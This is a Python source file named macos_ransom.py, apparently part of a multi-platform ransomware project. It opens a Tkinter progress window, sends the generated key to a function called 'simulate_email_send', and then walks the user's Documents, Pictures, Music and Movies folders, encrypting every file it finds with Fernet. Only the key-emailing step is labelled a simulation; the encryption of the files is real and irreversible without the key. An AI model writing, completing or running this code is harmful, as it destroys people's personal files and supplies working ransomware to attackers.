# macOS Version: platforms/macos_ransom.py
# macOS targets are similar to Linux, reusing the same TARGET_FOLDERS logic
# This script is identical in structure but separated for flexibility

import os
import tkinter as tk
from tkinter import ttk
import threading
from common.crypto_utils import generate_key, encrypt_file
from common.email_simulation import simulate_email_send

TARGET_FOLDERS = [
    os.path.expanduser("~/Documents"),
    os.path.expanduser("~/Pictures"),
    os.path.expanduser("~/Music"),
    os.path.expanduser("~/Movies"),
]

class RansomwareGUI:
    def __init__(self):
        self.root = tk.Tk()
        self.root.title("Encrypting Your Files...")
        self.progress = ttk.Progressbar(self.root, length=400, mode='determinate')
        self.progress.pack(pady=20)
        self.status_label = tk.Label(self.root, text="Starting encryption...")
        self.status_label.pack()

        threading.Thread(target=self.encrypt_all).start()
        self.root.mainloop()

    def encrypt_all(self):
        key = generate_key()
        simulate_email_send(key)
        from cryptography.fernet import Fernet
        fernet = Fernet(key)

        files = []
        for folder in TARGET_FOLDERS:
            for root, _, filenames in os.walk(folder):
                for file in filenames:
                    files.append(os.path.join(root, file))

        total = len(files)
        for i, file in enumerate(files, 1):
            encrypt_file(file, fernet)
            percent = int((i / total) * 100)
            self.progress['value'] = percent
            self.status_label.config(text=f"Encrypted {i}/{total} files...")
            self.root.update_idletasks()

        self.status_label.config(text="All files encrypted.")

if __name__ == '__main__':
    RansomwareGUI()
